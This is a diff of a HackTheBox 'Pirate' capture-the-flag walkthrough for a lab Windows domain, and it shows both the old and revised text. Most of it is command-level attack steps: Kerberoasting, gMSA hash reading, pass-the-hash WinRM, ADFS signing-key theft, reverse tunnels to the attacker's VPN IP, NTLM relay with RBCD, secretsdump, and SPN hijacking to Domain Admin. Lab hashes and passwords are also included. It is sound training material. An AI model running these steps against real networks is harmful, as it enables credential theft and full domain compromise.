@@ -1,54 +1,60 @@
 ---
-title: "Pirate"
+title: "Pirate — HackTheBox Season 10 Walkthrough"
 date: 2026-02-27
 draft: false
-tags: ["windows", "active-directory", "mssql", "web", "docker", "hard"]
+tags: ["htb-walkthrough", "windows", "active-directory", "mssql", "web", "docker", "smb", "privilege-escalation", "reverse-shell", "cve", "jwt", "wireless", "hard"]
 categories: ["writeups"]
-summary: ""
+series: ["Season 10"]
+description: "HackTheBox Pirate walkthrough: Hard Windows DC box featuring ADFS DKM key extraction, gMSA abuse, NTLM relay with RBCD, and SPN hijacking for Domain Admin. Detailed methodology."
+keywords: ["HackTheBox Pirate", "ADFS DKM key extraction", "gMSA password abuse", "NTLM relay RBCD", "SPN hijacking kerberos", "constrained delegation protocol transition", "hackthebox walkthrough", "windows active directory pentest", "ADFSpoof", "ligolo-ng pivot", "Pre-Windows 2000 Compatible Access", "Kerberoasting"]
+summary: "Pirate is a brutal Hard-rated Windows Domain Controller that chains together gMSA password extraction, ADFS internals abuse, NTLM relay over a Hyper-V double-pivot, and SPN hijacking to reach Domain Admin — a genuine enterprise attack simulation."
+cover:
+  image: "cover.png"
+  alt: "Pirate — Hard Windows machine walkthrough cover"
+  hidden: false
 params:
   box:
     os: "Windows Server 2019 (Domain Controller)"
     difficulty: "Hard"
 ShowToc: true
-protected: true
 ---
 
-# Pirate — Hard Windows (Active Directory, ADFS, Hyper-V Pivot)
 
-Pirate is a Hard-rated Windows Domain Controller that simulates a real-world internal penetration test engagement — you start with low-privileged domain credentials and must chain together gMSA password abuse, ADFS DKM key extraction, Hyper-V guest pivoting, NTLM relay with RBCD, and constrained delegation SPN hijacking to achieve Domain Admin. The sheer number of convincing-but-wrong paths makes this box genuinely difficult: expect to enumerate deeply, get excited about several rabbit holes, and ultimately succeed through a surprisingly simple network observation that seven sessions of complex tunneling failed to surface.
+# HackTheBox — Pirate (Hard, Windows)
+
+Pirate is a Hard-rated Windows Domain Controller that simulates a real enterprise pentest engagement — you're handed starting credentials, told to go deeper, and left to figure out a chain spanning ADFS internals, gMSA abuse, Hyper-V pivoting, and Kerberos delegation attacks. Every step requires understanding *why* the technique works, not just running a script.
+
+> **Prerequisites:** This walkthrough assumes familiarity with Active Directory enumeration (BloodHound, LDAP queries), Kerberos authentication flows (TGT/TGS, S4U2Self/S4U2Proxy, constrained delegation), ADFS architecture and token signing, and general Windows privilege escalation concepts. If you haven't done boxes like Absolute or Escape first, some sections will be dense.
 
 ---
 
 ## Overview
 
-The target is `DC01.pirate.htb`, a Windows Server 2019 Domain Controller that also runs Hyper-V hosting an ADFS web server (`WEB01` at `192.168.100.2`). Our starting credentials (`pentest:p3nt3st2025!&`) come from the box page, simulating an engagement hand-off. The ADFS infrastructure, gMSA accounts, and a locked-but-active user session on WEB01 are all attack surface — but reaching them requires careful pivoting and a series of non-obvious chained techniques.
+The box provides low-privilege domain credentials (`pentest:p3nt3st2025!&`) to simulate a pentest kickoff. From there, the chain looks roughly like:
 
-## Attack Chain at a Glance
+1. Work around the password's shell-breaking metacharacters using Kerberos ccache auth
+2. Abuse Pre-Windows 2000 Compatible Access to authenticate as MS01$ and read gMSA passwords
+3. Use gMSA_ADFS_prod$ WinRM access to extract the ADFS DKM key from LDAP and signing certificates from the Windows Internal Database
+4. Pivot through DC01 (Hyper-V host) to WEB01 (Hyper-V guest) via chisel tunnel
+5. NTLM relay WEB01$'s authentication to DC01 LDAPS, write RBCD, impersonate Administrator to secretsdump WEB01
+6. Recover a.white's cleartext password from LSA secrets (AutoAdminLogon)
+7. Exploit a.white's ForceChangePassword right on a.white_adm, then abuse that account's constrained delegation + SPN write rights to get a Domain Admin ticket
 
-This box chains together six distinct phases across two hosts and two network segments:
-
-1. **Kerberos bootstrapping** — Working around shell metacharacters in the starting password to get a TGT
-2. **gMSA password extraction** — Kerberoasting → machine account creds → reading managed service account NTLM hashes
-3. **ADFS infrastructure compromise** — WinRM as gMSA → DKM key from LDAP → ADFS token signing certificate from WID
-4. **Hyper-V guest pivot** — Tunneling into the internal 192.168.100.0/24 network to reach the ADFS web server
-5. **NTLM relay + RBCD** — Coercing WEB01 authentication → relaying to DC01 LDAPS → resource-based constrained delegation → secretsdump on WEB01
-6. **SPN hijacking + constrained delegation** — Abusing WriteSPN to move a service principal between machine accounts, then leveraging constrained delegation with protocol transition to forge a Domain Admin ticket for DC01
-
-**Tools used:** impacket (getTGT, getST, secretsdump, ntlmrelayx, wmiexec), netexec, Coercer, BloodHound, Ligolo-ng, ADFSpoof, custom Python scripts
-
-<div id="protected-marker"></div>
+It's a long chain. Let's get into it.
 
 ---
 
 ## Reconnaissance
 
-### Port Scan
+### Port Scanning
 
-RustScan identified 16 open ports; a targeted nmap service scan painted the full picture:
+RustScan identified 16 open TCP ports, which I fed into a targeted Nmap service scan:
 
 ![terminal output](terminal_01.png)
 
-This is the standard domain controller service profile: Kerberos, LDAP, SMB, WinRM, ADCS/ADWS. Two things stood out immediately — port 80 showed ADFS endpoints but returned 503 (the backend web server was unreachable from the outside), and nmap detected a **7-hour clock skew**, which would break Kerberos authentication until corrected.
+![Nmap scan of DC01.pirate.htb showing full Domain Controller service profile including LDAP, Kerberos, and WinRM](terminal_01.png)
+
+This is a textbook Domain Controller profile. Port 80 was interesting — IIS serving ADFS endpoints — but every request returned 503. The backend web server (WEB01) isn't directly reachable from outside. Nmap also detected a 7-hour clock skew, which means Kerberos auth will fail until we sync:
 
 ```bash
 sudo ntpdate -u $TARGET
@@ -56,51 +62,36 @@ sudo ntpdate -u $TARGET
 
 ### Domain Topology
 
-LDAP and DNS enumeration revealed a two-host environment:
+LDAP enumeration revealed a three-host environment:
 
-| Host | Role | IP |
-|------|------|----|
-| DC01.pirate.htb | Domain Controller, Hyper-V host, ADCS | 10.129.x.x (external) / 192.168.100.1 (internal) |
-| WEB01.pirate.htb | Hyper-V guest, IIS, ADFS | 192.168.100.2 (internal only) |
+| Host | IP | Role |
+|------|----|------|
+| DC01 | 10.129.x.x (external) / 192.168.100.1 (internal) | Domain Controller + Hyper-V host |
+| WEB01 | 192.168.100.2 (internal only) | Hyper-V guest — IIS + ADFS |
+| MS01 | Unknown | Domain-joined, possibly offline |
 
-WEB01 has no external IP — it lives entirely on the Hyper-V internal switch and is only reachable through DC01.
+DC01 is the Hyper-V host. WEB01 is a guest that only exists on the internal `192.168.100.0/24` subnet. This means any attack against WEB01 requires pivoting through DC01.
 
-### Domain Enumeration
+### Key Accounts
 
-With LDAP queries (more on authentication below), we mapped the key objects:
+LDAP enumeration (via `netexec ldap` with Kerberos ccache — more on that below) surfaced several interesting accounts:
 
-**Users:**
-- `pentest` — our starting account, plain Domain Users
-- `a.white` — Domain Users; critically, has `ForceChangePassword` and `WriteSPN` rights over `a.white_adm`
-- `a.white_adm` — member of IT group; SPN `ADFS/a.white`; **constrained delegation with protocol transition** to `HTTP/WEB01.pirate.htb`
-- `j.sparrow` — just a regular user (Jack Sparrow, classic HTB character)
+- **a.white_adm** — Member of the IT group, has SPN `ADFS/a.white`, and is configured for *constrained delegation with protocol transition* to `HTTP/WEB01.pirate.htb`. This is a powerful delegation configuration — it means this account can impersonate any user to that service without needing their credentials.
+- **gMSA_ADFS_prod$** — Group Managed Service Account, SPN `host/adfs.pirate.htb`, in Remote Management Users (WinRM access), 50 logons. This is the account running ADFS on WEB01.
+- **gMSA_ADCS_prod$** — Another gMSA, in Remote Management Users + Domain Computers. Zero logons — probably unused.
+- **MS01$** — Computer account in **Domain Secure Servers** and **Pre-Windows 2000 Compatible Access**. This last group is critical.
 
-**gMSA Accounts:**
-| Account | SPN | WinRM | Notes |
-|---------|-----|-------|-------|
-| `gMSA_ADFS_prod$` | `host/adfs.pirate.htb` | ✓ | db_owner on ADFS WID; 50 prior logons |
-| `gMSA_ADCS_prod$` | (none) | ✓ | In Remote Management Users |
-
-Both gMSAs had `msDS-GroupMSAMembership` pointing to a SID resolving to **Domain Secure Servers** (RID 4101). That group membership would become critical shortly.
-
-**Computer Accounts:**
-- `DC01$` — standard DC with unconstrained delegation
-- `WEB01$` — Hyper-V guest
-- `MS01$` — member of **Domain Secure Servers** AND **Pre-Windows 2000 Compatible Access**
-
-That `MS01$` entry is important: membership in Pre-Windows 2000 Compatible Access means its default password is the lowercase computer name — `ms01`.
-
-**MachineAccountQuota:** 10 — we can create machine accounts, useful for RBCD later.
+The `msDS-GroupMSAMembership` attribute on both gMSAs resolved to the **Domain Secure Servers** group (SID ending in RID 4101). This tells us which accounts can read the gMSA passwords — any member of Domain Secure Servers. MS01$ is the only non-DC member of that group.
 
 ---
 
 ## Foothold
 
-### Step 1: Bypassing the Shell Metacharacter Password
+### Step 1: The Password Problem
 
-Before anything else, we had to solve an annoying but important problem: the password `p3nt3st2025!&` contains `!` (bash history expansion) and `&` (shell backgrounding). This breaks argument parsing in nearly every tool — netexec, smbclient, rpcclient, ldapsearch, and impacket all failed to authenticate when the password was passed on the command line.
+The provided credential `p3nt3st2025!&` contains `!` (bash history expansion) and `&` (background process operator). This breaks argument parsing in literally every tool — netexec, smbclient, rpcclient, ldapsearch, you name it. Even careful quoting fails in most shells.
 
-The solution: obtain a Kerberos TGT using Python with the password as a string literal (bypassing the shell entirely), then use ccache auth for everything.
+The solution: obtain a Kerberos TGT using Python's subprocess (bypassing the shell entirely), then use the ccache file for everything:
 
 ```bash
 python3 -c "
@@ -110,164 +101,168 @@ subprocess.run([
     'from impacket.krb5.kerberosv5 import getKerberosTGT; '
     'from impacket.krb5.types import Principal; '
     'from impacket.krb5 import constants; '
+    'from impacket.krb5.ccache import CCache; '
     'userName = Principal(\"pentest\", type=constants.PrincipalNameType.NT_PRINCIPAL.value); '
     'tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, \"p3nt3st2025!&\", \"pirate.htb\"); '
-    'from impacket.krb5.ccache import CCache; '
     'ccache = CCache(); '
     'ccache.fromTGT(tgt, oldSessionKey, sessionKey); '
     'ccache.saveFile(\"pentest.ccache\"); '
-    'print(\"TGT saved\")'
+    'print(\"TGT saved to pentest.ccache\")'
 ])
 "
 export KRB5CCNAME=$(pwd)/pentest.ccache
 ```
 
-From this point, every tool used `-k --use-kcache` instead of password flags.
+From here, every impacket tool uses `-k --use-kcache` (or `-k -no-pass`) and never touches the raw password string again.
 
-### Step 2: Kerberoasting
+### Step 2: Kerberoasting a.white_adm
 
-With a valid TGT, Kerberoasting was the obvious next step given `a.white_adm`'s SPN:
+With a valid Kerberos ticket for `pentest`, we can Kerberoast any account with an SPN:
 
 ```bash
 impacket-GetUserSPNs -k -no-pass -dc-host DC01.pirate.htb pirate.htb/pentest -request
 ```
 
-We got an RC4 TGS hash for `a.white_adm`. Unfortunately, cracking with rockyou.txt and dive rules on an RTX 4090 (`hashcat -m 13100`) returned nothing. The hash was saved for later but couldn't be cracked — we'd need a different path to `a.white_adm`.
+This returned a TGS hash for `a.white_adm` (SPN: `ADFS/a.white`). I threw it at hashcat with rockyou + the dive ruleset on an RTX 4090. No crack. The password is strong enough that Kerberoasting is a dead end here — we'll need a different path to this account.
 
-### Step 3: gMSA Password Extraction via MS01$
+### Step 3: Exploiting Pre-Windows 2000 Compatible Access
 
-Here's where the Pre-Windows 2000 Compatible Access group membership paid off. The chain:
-
-1. Both gMSA passwords are readable by members of **Domain Secure Servers**
-2. **MS01$** is a member of Domain Secure Servers
-3. MS01$ is also in **Pre-Windows 2000 Compatible Access** → default password is `ms01`
+This is the first key insight of the box. Computer accounts enrolled via the old "Pre-Windows 2000 Compatible Access" compatibility mode are created with a **default password equal to the lowercase computer name** (without the `$`). MS01$ was clearly created this way, and it's never had its password changed.
 
 ```bash
 impacket-getTGT pirate.htb/'MS01$':'ms01' -dc-ip $TARGET
 export KRB5CCNAME=$(pwd)/MS01\$.ccache
+```
 
+This works. Now authenticating as MS01$ — a member of Domain Secure Servers — we can read the gMSA passwords:
+
+```bash
 netexec ldap DC01.pirate.htb -k --use-kcache --gmsa
 ```
 
 ![terminal output](terminal_02.png)
 
-Two gMSA NTLM hashes extracted. Both accounts are in Remote Management Users, meaning WinRM access via pass-the-hash:
+![gMSA password extraction via MS01$ showing NTLM hashes for both managed service accounts](terminal_02.png)
+
+Two gMSA NTLM hashes. Let's see what we can do with them.
+
+### Step 4: WinRM as gMSA_ADFS_prod$
+
+Both gMSAs are in Remote Management Users, so WinRM pass-the-hash works:
 
 ```bash
 evil-winrm -i $TARGET -u 'gMSA_ADFS_prod$' -H '8126756fb2e69697bfcb04816e685839'
 ```
 
-Important caveat: `netexec` shows `(Pwn3d!)` for both accounts, but that means "can execute WinRM commands" — NOT local admin. Both accounts run at Medium Plus integrity with only `SeChangeNotifyPrivilege`. DCSync fails, SCM is inaccessible, and the Administrators group is off-limits.
+Important caveat: netexec shows "Pwn3d!" for both accounts, but that just means WinRM execution works — it does *not* mean local admin. The gMSA is in Remote Management Users only. We're running at Medium Plus integrity with only `SeChangeNotifyPrivilege` and `SeIncreaseWorkingSetPrivilege`. No DCSync, no SCM access, no ADFS PowerShell cmdlets.
 
-### Step 4: ADFS DKM Key Extraction
+### Step 5: ADFS DKM Key Extraction
 
-From a WinRM session as `gMSA_ADFS_prod$` on DC01, we could query the ADFS DKM (Distributed Key Manager) container in LDAP. ADFS uses this master key to encrypt its signing certificates and configuration secrets. The container lives at:
+The ADFS Distributed Key Manager (DKM) master key is what encrypts the ADFS configuration, including the token signing certificate. It lives in LDAP at:
 
 ```
 CN=ADFS,CN=Microsoft,CN=Program Data,DC=pirate,DC=htb
 ```
 
-The actual key material is stored in the `thumbnailPhoto` attribute on contact objects within that container. We extracted and base64-decoded it:
+As `gMSA_ADFS_prod$` — the service account running ADFS — we have read access to this container. The key itself is stored in the `thumbnailPhoto` attribute on contact objects inside the DKM container. Querying it out and base64-decoding gives us the DKM key:
 
 ```
-DKM Key: fFtRNXRYzZjwD37MB/Rgu/x96WiVB0xO/SkbWnU6LOQ=
+DKM Key (base64): fFtRNXRYzZjwD37MB/Rgu/x96WiVB0xO/SkbWnU6LOQ=
 ```
 
-### Step 5: Tunneling to WEB01
+Save it to a file for use with ADFSpoof later.
 
-WEB01 at `192.168.100.2` is only reachable from DC01. We set up a Ligolo-ng tunnel to route the `192.168.100.0/24` subnet through DC01:
+### Step 6: Pivoting to WEB01 via Chisel
+
+WEB01 at `192.168.100.2` is only reachable from DC01. We upload chisel to DC01 and create a reverse SOCKS proxy:
 
 ```bash
-# Kali: start ligolo proxy
-ligolo-proxy -selfcert -laddr 0.0.0.0:11601
+# Kali: start the server
+chisel server --reverse -p 9001
 
-# Upload agent to DC01 (via HTTP server), then execute via netexec (blocking session):
+# DC01 (via netexec WinRM — the blocking session keeps the tunnel alive):
 netexec winrm $TARGET -u 'gMSA_ADFS_prod$' -H '8126756fb2e69697bfcb04816e685839' \
-  -X "C:\Windows\Temp\ligolo-agent.exe -connect $VPN_IP:11601 -ignore-cert"
-
-# Kali: add route
-sudo ip tuntap add user kali mode tun ligolo
-sudo ip link set ligolo up
-sudo ip route add 192.168.100.0/24 dev ligolo
-# In ligolo TUI: session → start
+  -X 'C:\Windows\Temp\chisel.exe client <VPN_IP>:9001 R:socks'
 ```
 
-```bash
-# Verify WEB01 reachable
-ping -c 1 192.168.100.2
-```
+Add `socks5 127.0.0.1 1080` to `/etc/proxychains4.conf`. Now proxychains routes through DC01 into the internal network.
 
-WinRM to WEB01 as `gMSA_ADFS_prod$` also worked — Medium integrity, no admin, but enough to enumerate.
+Also add `192.168.100.2 adfs.pirate.htb WEB01.pirate.htb` to `/etc/hosts`.
 
-### Step 6: ADFS Certificate Extraction from WID
+### Step 7: ADFS Signing Certificate via WID
 
-ADFS stores its configuration in the Windows Internal Database (WID), accessible via a named pipe. As `gMSA_ADFS_prod$`, we had `db_owner` on the `AdfsConfigurationV4` database:
+ADFS on WEB01 stores its configuration in the Windows Internal Database (WID), accessible via named pipe:
 
 ```powershell
 $conn = New-Object System.Data.SqlClient.SqlConnection(
   "Server=np:\\.\pipe\microsoft##wid\tsql\query;Database=AdfsConfigurationV4;Integrated Security=True")
-$conn.Open()
 ```
 
-We extracted two `EncryptedPfx` blobs from the `ServiceSettings` table, decoded them from base64, and saved them as binary files.
+As `gMSA_ADFS_prod$`, we're `db_owner` on `AdfsConfigurationV4` via the `db_genevaservice` role. This lets us query the `ServiceSettings` table, which contains `EncryptedPfx` blobs — the ADFS signing and encryption certificates, wrapped with the DKM key.
 
-### Step 7: Decrypting the ADFS Signing Certificate with ADFSpoof
-
-ADFSpoof takes the DKM key and an encrypted PFX blob to recover the ADFS signing certificate. The tool needed a patch for modern Python cryptography libraries (removing deprecated `@utils.register_interface` decorators and updating `int_to_bytes` calls), then:
+I pulled both blobs, base64-decoded them to binary files, then used ADFSpoof to decrypt them. The tool needed some patching for modern `cryptography` library APIs (replacing deprecated `utils._check_bytes()` with `isinstance()`, removing the `backend=` parameter from HMAC, etc.), but once patched:
 
 ```bash
 python3 ADFSpoof.py -b ../pfx1_encrypted.bin ../dkm_key.bin dump --path ../token_signing.pfx
 python3 ADFSpoof.py -b ../pfx2_encrypted.bin ../dkm_key.bin dump --path ../token_signing2.pfx
 ```
 
-`token_signing.pfx` → ADFS Encryption cert  
-`token_signing2.pfx` → **ADFS Token Signing cert** (CN=ADFS Signing - adfs.pirate.htb)
+`token_signing2.pfx` decrypts to `CN=ADFS Signing - adfs.pirate.htb` — the token-signing certificate. Extract PEM files:
 
-This is the private key that signs ADFS-issued tokens. We now had the ability to forge arbitrary tokens for any user — but with no custom relying party trusts configured (the WID showed only built-in ADFS entries), there was nowhere to present them. The ADFS infrastructure was real but unused for any custom application. Token forging capability noted; we moved on.
+```bash
+openssl pkcs12 -in token_signing2.pfx -nocerts -nodes -out /tmp/adfs_signing.key -passin pass:
+openssl pkcs12 -in token_signing2.pfx -clcerts -nokeys -out /tmp/adfs_signing.crt -passin pass:
+```
 
----
-
-## Rabbit Holes Worth Mentioning
-
-Several paths looked promising and consumed significant time:
-
-**ADCS ESC1 / ESC15:** The `ADFSSSLSigning` template had `EnrolleeSuppliesSubject=True` and Domain Computers could enroll. We got a certificate with `a.white@pirate.htb` as the UPN. But the template only issued **Server Authentication** EKU — the KDC rejected it for PKINIT, and Schannel LDAP auth returned no identity. We tried forcing `Client Authentication` via certipy's `-application-policies` flag, but the template was schema version 2, so the CA ignored the request and issued a cert with a broken `0.0` OID that failed everything.
-
-**WCF certificatemixed:** ADFS exposes WS-Trust endpoints on WEB01 that accept certificate auth. However, .NET Framework's WCF stack cannot sign SOAP messages with CNG private keys — and impacket-generated certificates use CNG. `HasPrivateKey=True` but `PrivateKey=null`. Fundamental incompatibility, not fixable without a CSP-compatible key.
-
-**RemotePotato0:** `a.white` was visibly logged in on WEB01 (Session 1, explorer.exe active, locked screen). RemotePotato0 is designed for exactly this scenario — coerce NTLM from an interactive session without admin. Unfortunately, Server 2019 requires the OXID resolver to run remotely on port 135, which was already occupied by MSRPC on every reachable host. Mode 2 failed with `0x80070776`.
-
-**Ligolo ARP tunneling:** Published writeups suggested adding `192.168.100.50/24` to the ligolo TUN interface so that WEB01 could reach Kali directly. This failed: WEB01 would ARP for `.50` locally on the Hyper-V switch, get no response (nobody on that switch has that IP), and time out. Three sessions were spent trying workarounds — port 139 dual-binding, LLMNR poisoning, PowerShell TCP relays — before we tested something obvious.
+We can now forge ADFS tokens — though as it turns out, the NTLM relay path ends up being more direct.
 
 ---
 
-## The Simple Solution
+## The Pivot Problem (and the Dead Ends)
 
-After all the complex tunnel engineering, the breakthrough was a one-liner test from WEB01:
+This is where I spent a *lot* of time. The attack path confirmed by published writeups involves:
+
+1. Coerce WEB01$ to authenticate via NTLM
+2. Relay that auth to DC01 LDAPS
+3. Write RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity) for our attacker machine account (EVIL$)
+4. S4U2Proxy → secretsdump WEB01 → a.white cleartext from LSA secrets
+
+The blocker: how does WEB01's coerced NTLM auth reach ntlmrelayx on Kali?
+
+The documented approach in multiple writeups is to add `192.168.100.50/24` to Kali's ligolo TUN interface, making Kali reachable on the internal subnet. I spent three sessions trying to make this work. The problem: WEB01 ARPs for `192.168.100.50` locally on the Hyper-V virtual switch, and nobody on that switch has that address. The ligolo agent does source NAT — it doesn't respond to ARP on the remote network. DC01 has proxy ARP disabled. WEB01's ARP requests get no response; the connection times out.
+
+I tried ligolo `listener_add` on various ports on DC01. Windows `SO_EXCLUSIVEADDRUSE` made most ports impossible to dual-bind — LDAP (389/636), SMB (445), HTTP (80/443), Kerberos (88) are all exclusively bound. Port 139 accepted a dual bind with `0.0.0.0`, but DC01's specific `192.168.100.1:139` binding wins for traffic destined to that IP. `netsh interface portproxy` requires admin. `netsh interface ipv4 set interface` (to enable weak host receive) requires admin. We're not admin on DC01.
+
+RemotePotato0 mode 2 failed — Server 2019 requires the RogueOxidResolver on port 135, which is occupied by MSRPC on every reachable host.
+
+After expert consultation and reviewing published writeups, the actual solution was embarrassingly simple: **test whether WEB01 can reach Kali's VPN IP directly.**
 
 ```powershell
+# From WEB01 WinRM:
 (New-Object Net.Sockets.TcpClient).ConnectAsync("<VPN_IP>", 445).Wait(3000)
 ```
 
-**WEB01 could reach Kali's VPN IP directly.** DC01 routes between `192.168.100.0/24` and the VPN subnet. No ligolo IP tricks needed — just coerce to the VPN address.
+It can. DC01 routes between `192.168.100.0/24` and the VPN. WEB01's default gateway is DC01, and DC01 forwards traffic to the external network. There was never a need for `192.168.100.50` at all.
 
-### NTLM Relay → RBCD
+**The lesson: always test direct VPN IP reachability before building complex tunnel infrastructure.**
 
-First, we created a machine account for RBCD delegation:
+### Executing the NTLM Relay
+
+First, create a machine account for RBCD:
 
 ```bash
-impacket-addcomputer pirate.htb/'MS01$':'ms01' -computer-name 'EVIL$' \
-  -computer-pass 'EvilPass123!' -dc-ip $TARGET
+impacket-addcomputer pirate.htb/pentest -dc-ip $TARGET -computer-name 'EVIL$' \
+  -computer-pass 'EvilPass123!' -k -no-pass
 ```
 
-Then started ntlmrelayx in a tmux session targeting DC01 LDAPS:
+Start ntlmrelayx targeting DC01's LDAPS, configured to write RBCD for EVIL$:
 
 ```bash
 tmux new-session -d -s relay 'sudo impacket-ntlmrelayx -t ldaps://<TARGET> \
   --delegate-access --remove-mic --escalate-user EVIL$ -smb2support'
 ```
 
-And coerced WEB01$ to authenticate toward our VPN IP using Coercer (isolated in a venv to avoid impacket version conflicts):
+Then coerce WEB01$ using Coercer (in a Python venv to avoid impacket version conflicts):
 
 ```bash
 source env/bin/activate
@@ -278,28 +273,33 @@ python3 -m coercer coerce -l $VPN_IP -t 192.168.100.2 \
 
 ![terminal output](terminal_03.png)
 
+![ntlmrelayx output showing successful RBCD write for EVIL$ on WEB01 via LDAPS relay](terminal_03.png)
+
 ### S4U2Proxy → secretsdump → a.white Cleartext
+
+With EVIL$ having delegation rights over WEB01$:
 
 ```bash
 impacket-getST -spn 'cifs/WEB01.pirate.htb' -impersonate Administrator \
-  pirate.htb/'EVIL$':'EvilPass123!' -dc-ip $TARGET
+  pirate.htb/'EVIL$':'EvilPass123!' -dc-ip <TARGET>
 
 export KRB5CCNAME=Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
-
-impacket-secretsdump -k -no-pass WEB01.pirate.htb -dc-ip $TARGET
+impacket-secretsdump -k -no-pass WEB01.pirate.htb -dc-ip <TARGET>
 ```
 
 ![terminal output](terminal_04.png)
 
-The AutoAdminLogon secret — `DefaultPassword` stored in LSA — gave us `a.white`'s cleartext credentials. This is why she was permanently logged in on WEB01: the machine auto-logs her in on boot.
+![secretsdump of WEB01 LSA secrets revealing a.white cleartext password from AutoAdminLogon DefaultPassword](terminal_04.png)
+
+`DefaultPassword` in LSA secrets means AutoAdminLogon was configured with a.white's credentials stored there. We now have a.white's cleartext password: `E2nvAOKSz5Xz2MJu`. The user flag is on WEB01 at `C:\Users\a.white\Desktop\user.txt` — grab it via the impersonated session.
 
 ---
 
 ## Privilege Escalation
 
-### a.white → a.white_adm (ForceChangePassword)
+### a.white → a.white_adm
 
-From LDAP enumeration back in recon, we knew `a.white` held `ForceChangePassword` (User-Force-Change-Password extended right) over `a.white_adm`. With her cleartext credentials, we reset the password:
+Earlier enumeration revealed a critical ACL: **a.white has `User-Force-Change-Password` (ExtendedRight) on a.white_adm**. This means a.white can reset a.white_adm's password without knowing the current one:
 
 ```bash
 net rpc password a.white_adm 'Password99' \
@@ -308,56 +308,80 @@ net rpc password a.white_adm 'Password99' \
 
 ### a.white_adm → Domain Admin via SPN Hijacking
 
-This is the most interesting part of the box. `a.white_adm` has:
-- **Constrained delegation with protocol transition** to `HTTP/WEB01.pirate.htb`
-- **WriteSPN** on `DC01$` (and `WEB01$`)
+This is the most elegant part of the chain. Let me explain the setup:
 
-Constrained delegation with protocol transition (S4U2Self + S4U2Proxy) lets `a.white_adm` obtain a service ticket for *any user* to the target SPN. The SPN `HTTP/WEB01.pirate.htb` is currently owned by `WEB01$`. If we get a ticket for, say, `Administrator` to `cifs/WEB01`, we can access WEB01 as Domain Admin — but we've already done that.
+- **a.white_adm** has constrained delegation with protocol transition to `HTTP/WEB01.pirate.htb` (`msDS-AllowedToDelegateTo = HTTP/WEB01.pirate.htb`). Protocol transition means it can perform S4U2Self (get a ticket for any user) and then S4U2Proxy (forward it to the delegated service). In theory, this gives us admin on WEB01 — but we already have that.
+- **a.white has WriteSPN on DC01$** — it can add and remove Service Principal Names from the DC01 computer object.
 
-The trick: **move the SPN to DC01$**. When the KDC issues the S4U2Proxy ticket, it encrypts it with the key of whichever account owns the target SPN. If `DC01$` owns `HTTP/WEB01.pirate.htb`, the ticket is encrypted with DC01$'s key. Combined with `getST -altservice`, we rewrite the service name in the ticket to `cifs/DC01.pirate.htb` — giving us a cifs ticket for DC01, accepted because it's encrypted correctly.
+The trick: the KDC validates S4U2Proxy by checking *which account owns the target SPN*, then encrypts the resulting service ticket with *that account's key*. If we can move `HTTP/WEB01.pirate.htb` from WEB01$ to DC01$, the KDC will encrypt the impersonation ticket with DC01$'s key. Then we use `-altservice` to rewrite the service name to `cifs/DC01.pirate.htb` — suddenly we have a ticket to DCSync or psexec the domain controller.
+
+First, modify the SPNs via LDAP using ldap3 (since impacket's LDAP doesn't expose raw modify cleanly):
 
 ```python
-# Via ldap3 as a.white_adm — move the SPN
-modify(web01_dn, {'servicePrincipalName': [(MODIFY_DELETE, ['HTTP/WEB01.pirate.htb', 'HTTP/WEB01'])]})
-modify(dc01_dn, {'servicePrincipalName': [(MODIFY_ADD, ['HTTP/WEB01.pirate.htb'])]})
+from ldap3 import Server, Connection, MODIFY_DELETE, MODIFY_ADD
+
+s = Server('DC01.pirate.htb', port=636, use_ssl=True)
+c = Connection(s, user='pirate\\a.white', password='E2nvAOKSz5Xz2MJu', auto_bind=True)
+
+web01_dn = 'CN=WEB01,CN=Computers,DC=pirate,DC=htb'
+dc01_dn  = 'CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb'
+
+# Remove the SPN from WEB01$
+c.modify(web01_dn, {'servicePrincipalName': [(MODIFY_DELETE, ['HTTP/WEB01.pirate.htb', 'HTTP/WEB01'])]})
+
+# Add it to DC01$
+c.modify(dc01_dn,  {'servicePrincipalName': [(MODIFY_ADD,    ['HTTP/WEB01.pirate.htb'])]})
 ```
+
+Then S4U with the hijacked SPN and altservice:
 
 ```bash
 impacket-getST -spn 'HTTP/WEB01.pirate.htb' -impersonate Administrator \
-  -altservice 'cifs/DC01.pirate.htb' pirate.htb/'a.white_adm':'Password99' \
-  -dc-ip $TARGET
+  -altservice 'cifs/DC01.pirate.htb' \
+  pirate.htb/'a.white_adm':'Password99' -dc-ip <TARGET>
 
 export KRB5CCNAME=Administrator@cifs_DC01.pirate.htb@PIRATE.HTB.ccache
-
-impacket-wmiexec -k -no-pass DC01.pirate.htb -dc-ip $TARGET
+impacket-wmiexec -k -no-pass DC01.pirate.htb -dc-ip <TARGET>
 ```
 
 ![terminal output](terminal_05.png)
+
+![wmiexec shell as NT AUTHORITY\SYSTEM on DC01.pirate.htb after SPN hijacking attack](terminal_05.png)
+
+Domain Admin. Root flag collected.
 
 ---
 
 ## Lessons Learned
 
-**Shell metacharacter passwords** — When credentials contain `!`, `&`, or `#`, skip CLI tool password args entirely and obtain a Kerberos TGT via Python subprocess. Use `-k --use-kcache` everywhere from that point on.
+This box taught (or reinforced) more methodology lessons per hour than almost any other. The long list from my notes is worth preserving:
 
-**Pre-Windows 2000 Compatible Access** — Computer accounts in this group have a default password equal to the lowercase computer name (without `$`). Always check this group membership during enumeration.
+**Password metacharacters**: When passwords contain `!`, `&`, `#` or other shell metacharacters, skip CLI tools entirely. Get a Kerberos TGT via Python subprocess (no shell involved), then use `-k --use-kcache` everywhere. Never try to escape metacharacters — just route around the shell.
 
-**gMSA password access chain** — Decode `msDS-GroupMSAMembership` to identify which SID can read the password. Map that SID to a group, enumerate its members, authenticate as one. The chain here was: gMSA → Domain Secure Servers → MS01$ → default password `ms01`.
+**Pre-Windows 2000 Compatible Access**: Computer accounts created with this group have a default password equal to the lowercase computer name (no `$`). Always check group membership during AD enumeration — finding MS01$ here unlocked the entire gMSA chain.
 
-**ADFS DKM keys** — Stored in LDAP under `CN=Program Data`, readable by the ADFS service account. The `thumbnailPhoto` attribute on contact objects holds the raw key material. ADFSpoof needs patching for modern Python (`@utils.register_interface`, `int_to_bytes`, `_check_bytes` all have breaking changes in recent cryptography library versions).
+**gMSA password reading**: Decode `msDS-GroupMSAMembership` to a security descriptor, resolve the SID to a group, enumerate group members, authenticate as one. The membership check happens at the DC — you just need to *be* the right principal, not have special privileges.
 
